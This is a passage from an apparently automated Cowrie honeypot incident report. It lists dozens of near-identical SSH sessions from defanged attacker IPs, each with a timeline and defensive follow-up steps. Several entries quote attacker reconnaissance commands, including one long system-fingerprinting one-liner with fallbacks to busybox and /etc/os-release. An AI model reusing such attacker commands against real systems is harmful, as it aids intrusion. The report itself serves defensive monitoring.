| `2026-08-11 08:47:27` | `cowrie.session.params` |
| `2026-08-11 08:47:27` | `cowrie.command.input` |
| `2026-08-11 08:47:27` | `cowrie.log.closed` |
| `2026-08-11 08:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0506976b8e0a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:47 |
| **Last Seen** | 2026-08-11 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:47:31` | `cowrie.session.connect` |
| `2026-08-11 08:47:31` | `cowrie.client.version` |
| `2026-08-11 08:47:31` | `cowrie.client.kex` |
| `2026-08-11 08:47:31` | `cowrie.login.success` |
| `2026-08-11 08:47:32` | `cowrie.session.params` |
| `2026-08-11 08:47:32` | `cowrie.command.input` |
| `2026-08-11 08:47:33` | `cowrie.log.closed` |
| `2026-08-11 08:47:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-186bbd746b55

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:47 |
| **Last Seen** | 2026-08-11 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:47:36` | `cowrie.session.connect` |
| `2026-08-11 08:47:36` | `cowrie.client.version` |
| `2026-08-11 08:47:36` | `cowrie.client.kex` |
| `2026-08-11 08:47:36` | `cowrie.login.success` |
| `2026-08-11 08:47:37` | `cowrie.session.params` |
| `2026-08-11 08:47:37` | `cowrie.command.input` |
| `2026-08-11 08:47:37` | `cowrie.log.closed` |
| `2026-08-11 08:47:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fe78b093f8a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:47 |
| **Last Seen** | 2026-08-11 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:47:41` | `cowrie.session.connect` |
| `2026-08-11 08:47:41` | `cowrie.client.version` |
| `2026-08-11 08:47:41` | `cowrie.client.kex` |
| `2026-08-11 08:47:42` | `cowrie.login.success` |
| `2026-08-11 08:47:42` | `cowrie.session.params` |
| `2026-08-11 08:47:42` | `cowrie.command.input` |
| `2026-08-11 08:47:43` | `cowrie.log.closed` |
| `2026-08-11 08:47:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c0e0a3c69ac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:47 |
| **Last Seen** | 2026-08-11 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:47:46` | `cowrie.session.connect` |
| `2026-08-11 08:47:46` | `cowrie.client.version` |
| `2026-08-11 08:47:46` | `cowrie.client.kex` |
| `2026-08-11 08:47:47` | `cowrie.login.success` |
| `2026-08-11 08:47:47` | `cowrie.session.params` |
| `2026-08-11 08:47:47` | `cowrie.command.input` |
| `2026-08-11 08:47:48` | `cowrie.log.closed` |
| `2026-08-11 08:47:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e916bd75bef

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:47 |
| **Last Seen** | 2026-08-11 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:47:51` | `cowrie.session.connect` |
| `2026-08-11 08:47:51` | `cowrie.client.version` |
| `2026-08-11 08:47:51` | `cowrie.client.kex` |
| `2026-08-11 08:47:52` | `cowrie.login.success` |
| `2026-08-11 08:47:52` | `cowrie.session.params` |
| `2026-08-11 08:47:52` | `cowrie.command.input` |
| `2026-08-11 08:47:53` | `cowrie.log.closed` |
| `2026-08-11 08:47:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b5b6de83fd3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:47 |
| **Last Seen** | 2026-08-11 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:47:56` | `cowrie.session.connect` |
| `2026-08-11 08:47:56` | `cowrie.client.version` |
| `2026-08-11 08:47:56` | `cowrie.client.kex` |
| `2026-08-11 08:47:57` | `cowrie.login.success` |
| `2026-08-11 08:47:58` | `cowrie.session.params` |
| `2026-08-11 08:47:58` | `cowrie.command.input` |
| `2026-08-11 08:47:58` | `cowrie.log.closed` |
| `2026-08-11 08:47:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7624f95f416

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:48 |
| **Last Seen** | 2026-08-11 08:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:48:01` | `cowrie.session.connect` |
| `2026-08-11 08:48:01` | `cowrie.client.version` |
| `2026-08-11 08:48:01` | `cowrie.client.kex` |
| `2026-08-11 08:48:02` | `cowrie.login.success` |
| `2026-08-11 08:48:03` | `cowrie.session.params` |
| `2026-08-11 08:48:03` | `cowrie.command.input` |
| `2026-08-11 08:48:03` | `cowrie.log.closed` |
| `2026-08-11 08:48:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cbc52d418af

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:48 |
| **Last Seen** | 2026-08-11 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:48:06` | `cowrie.session.connect` |
| `2026-08-11 08:48:06` | `cowrie.client.version` |
| `2026-08-11 08:48:06` | `cowrie.client.kex` |
| `2026-08-11 08:48:07` | `cowrie.login.success` |
| `2026-08-11 08:48:07` | `cowrie.session.params` |
| `2026-08-11 08:48:07` | `cowrie.command.input` |
| `2026-08-11 08:48:07` | `cowrie.log.closed` |
| `2026-08-11 08:48:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c11f017a904c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:48 |
| **Last Seen** | 2026-08-11 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:48:11` | `cowrie.session.connect` |
| `2026-08-11 08:48:11` | `cowrie.client.version` |
| `2026-08-11 08:48:11` | `cowrie.client.kex` |
| `2026-08-11 08:48:12` | `cowrie.login.success` |
| `2026-08-11 08:48:13` | `cowrie.session.params` |
| `2026-08-11 08:48:13` | `cowrie.command.input` |
| `2026-08-11 08:48:13` | `cowrie.log.closed` |
| `2026-08-11 08:48:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-096353152ed4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:48 |
| **Last Seen** | 2026-08-11 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:48:16` | `cowrie.session.connect` |
| `2026-08-11 08:48:16` | `cowrie.client.version` |
| `2026-08-11 08:48:16` | `cowrie.client.kex` |
| `2026-08-11 08:48:17` | `cowrie.login.success` |
| `2026-08-11 08:48:17` | `cowrie.session.params` |
| `2026-08-11 08:48:17` | `cowrie.command.input` |
| `2026-08-11 08:48:18` | `cowrie.log.closed` |
| `2026-08-11 08:48:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebc9af1a1d33

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:48 |
| **Last Seen** | 2026-08-11 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:48:21` | `cowrie.session.connect` |
| `2026-08-11 08:48:21` | `cowrie.client.version` |
| `2026-08-11 08:48:21` | `cowrie.client.kex` |
| `2026-08-11 08:48:22` | `cowrie.login.success` |
| `2026-08-11 08:48:23` | `cowrie.session.params` |
| `2026-08-11 08:48:23` | `cowrie.command.input` |
| `2026-08-11 08:48:23` | `cowrie.log.closed` |
| `2026-08-11 08:48:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b7bbfe7ba63

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:48 |
| **Last Seen** | 2026-08-11 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:48:26` | `cowrie.session.connect` |
| `2026-08-11 08:48:26` | `cowrie.client.version` |
| `2026-08-11 08:48:26` | `cowrie.client.kex` |
| `2026-08-11 08:48:27` | `cowrie.login.success` |
| `2026-08-11 08:48:28` | `cowrie.session.params` |
| `2026-08-11 08:48:28` | `cowrie.command.input` |
| `2026-08-11 08:48:28` | `cowrie.log.closed` |
| `2026-08-11 08:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe53b83e2eea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:48 |
| **Last Seen** | 2026-08-11 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:48:31` | `cowrie.session.connect` |
| `2026-08-11 08:48:31` | `cowrie.client.version` |
| `2026-08-11 08:48:32` | `cowrie.client.kex` |
| `2026-08-11 08:48:32` | `cowrie.login.success` |
| `2026-08-11 08:48:33` | `cowrie.session.params` |
| `2026-08-11 08:48:33` | `cowrie.command.input` |
| `2026-08-11 08:48:33` | `cowrie.log.closed` |
| `2026-08-11 08:48:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cad55746f9f3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:48 |
| **Last Seen** | 2026-08-11 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:48:37` | `cowrie.session.connect` |
| `2026-08-11 08:48:37` | `cowrie.client.version` |
| `2026-08-11 08:48:37` | `cowrie.client.kex` |
| `2026-08-11 08:48:37` | `cowrie.login.success` |
| `2026-08-11 08:48:38` | `cowrie.session.params` |
| `2026-08-11 08:48:38` | `cowrie.command.input` |
| `2026-08-11 08:48:38` | `cowrie.log.closed` |
| `2026-08-11 08:48:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a61ed2a557c9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:48 |
| **Last Seen** | 2026-08-11 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:48:42` | `cowrie.session.connect` |
| `2026-08-11 08:48:42` | `cowrie.client.version` |
| `2026-08-11 08:48:42` | `cowrie.client.kex` |
| `2026-08-11 08:48:42` | `cowrie.login.success` |
| `2026-08-11 08:48:43` | `cowrie.session.params` |
| `2026-08-11 08:48:43` | `cowrie.command.input` |
| `2026-08-11 08:48:43` | `cowrie.log.closed` |
| `2026-08-11 08:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94b4ef57cef3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:48 |
| **Last Seen** | 2026-08-11 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:48:47` | `cowrie.session.connect` |
| `2026-08-11 08:48:47` | `cowrie.client.version` |
| `2026-08-11 08:48:47` | `cowrie.client.kex` |
| `2026-08-11 08:48:47` | `cowrie.login.success` |
| `2026-08-11 08:48:48` | `cowrie.session.params` |
| `2026-08-11 08:48:48` | `cowrie.command.input` |
| `2026-08-11 08:48:48` | `cowrie.log.closed` |
| `2026-08-11 08:48:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d0f33e05cbc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:48 |
| **Last Seen** | 2026-08-11 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:48:52` | `cowrie.session.connect` |
| `2026-08-11 08:48:52` | `cowrie.client.version` |
| `2026-08-11 08:48:52` | `cowrie.client.kex` |
| `2026-08-11 08:48:53` | `cowrie.login.success` |
| `2026-08-11 08:48:54` | `cowrie.session.params` |
| `2026-08-11 08:48:54` | `cowrie.command.input` |
| `2026-08-11 08:48:54` | `cowrie.log.closed` |
| `2026-08-11 08:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a02fbdc5dd8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:48 |
| **Last Seen** | 2026-08-11 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:48:57` | `cowrie.session.connect` |
| `2026-08-11 08:48:57` | `cowrie.client.version` |
| `2026-08-11 08:48:57` | `cowrie.client.kex` |
| `2026-08-11 08:48:58` | `cowrie.login.success` |
| `2026-08-11 08:48:58` | `cowrie.session.params` |
| `2026-08-11 08:48:58` | `cowrie.command.input` |
| `2026-08-11 08:48:58` | `cowrie.log.closed` |
| `2026-08-11 08:48:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc7ac1c0be2a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:49 |
| **Last Seen** | 2026-08-11 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:49:02` | `cowrie.session.connect` |
| `2026-08-11 08:49:02` | `cowrie.client.version` |
| `2026-08-11 08:49:02` | `cowrie.client.kex` |
| `2026-08-11 08:49:03` | `cowrie.login.success` |
| `2026-08-11 08:49:04` | `cowrie.session.params` |
| `2026-08-11 08:49:04` | `cowrie.command.input` |
| `2026-08-11 08:49:04` | `cowrie.log.closed` |
| `2026-08-11 08:49:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00a8e57fd431

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:49 |
| **Last Seen** | 2026-08-11 08:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:49:03` | `cowrie.session.connect` |
| `2026-08-11 08:49:03` | `cowrie.client.version` |
| `2026-08-11 08:49:03` | `cowrie.client.kex` |
| `2026-08-11 08:49:05` | `cowrie.login.success` |
| `2026-08-11 08:49:06` | `cowrie.session.params` |
| `2026-08-11 08:49:06` | `cowrie.command.input` |
| `2026-08-11 08:49:06` | `cowrie.command.input` |
| `2026-08-11 08:49:06` | `cowrie.command.input` |
| `2026-08-11 08:49:06` | `cowrie.command.input` |
| `2026-08-11 08:49:06` | `cowrie.command.input` |
| `2026-08-11 08:49:06` | `cowrie.command.success` |
| `2026-08-11 08:49:06` | `cowrie.command.input` |
| `2026-08-11 08:49:06` | `cowrie.command.input` |
| `2026-08-11 08:49:06` | `cowrie.command.input` |
| `2026-08-11 08:49:06` | `cowrie.command.input` |
| `2026-08-11 08:49:06` | `cowrie.log.closed` |
| `2026-08-11 08:49:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-624a3ca4007b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:49 |
| **Last Seen** | 2026-08-11 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:49:07` | `cowrie.session.connect` |
| `2026-08-11 08:49:07` | `cowrie.client.version` |
| `2026-08-11 08:49:07` | `cowrie.client.kex` |
| `2026-08-11 08:49:08` | `cowrie.login.success` |
| `2026-08-11 08:49:08` | `cowrie.session.params` |
| `2026-08-11 08:49:08` | `cowrie.command.input` |
| `2026-08-11 08:49:09` | `cowrie.log.closed` |
| `2026-08-11 08:49:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3325b89704a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:49 |
| **Last Seen** | 2026-08-11 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:49:12` | `cowrie.session.connect` |
| `2026-08-11 08:49:12` | `cowrie.client.version` |
| `2026-08-11 08:49:12` | `cowrie.client.kex` |
| `2026-08-11 08:49:13` | `cowrie.login.success` |
| `2026-08-11 08:49:14` | `cowrie.session.params` |
| `2026-08-11 08:49:14` | `cowrie.command.input` |
| `2026-08-11 08:49:14` | `cowrie.log.closed` |
| `2026-08-11 08:49:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a092d49f0ac8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:49 |
| **Last Seen** | 2026-08-11 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:49:17` | `cowrie.session.connect` |
| `2026-08-11 08:49:17` | `cowrie.client.version` |
| `2026-08-11 08:49:17` | `cowrie.client.kex` |
| `2026-08-11 08:49:18` | `cowrie.login.success` |
| `2026-08-11 08:49:19` | `cowrie.session.params` |
| `2026-08-11 08:49:19` | `cowrie.command.input` |
| `2026-08-11 08:49:19` | `cowrie.log.closed` |
| `2026-08-11 08:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7e47ca46dd1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:49 |
| **Last Seen** | 2026-08-11 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:49:22` | `cowrie.session.connect` |
| `2026-08-11 08:49:22` | `cowrie.client.version` |
| `2026-08-11 08:49:22` | `cowrie.client.kex` |
| `2026-08-11 08:49:23` | `cowrie.login.success` |
| `2026-08-11 08:49:24` | `cowrie.session.params` |
| `2026-08-11 08:49:24` | `cowrie.command.input` |
| `2026-08-11 08:49:24` | `cowrie.log.closed` |
| `2026-08-11 08:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d76b6acaa615

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
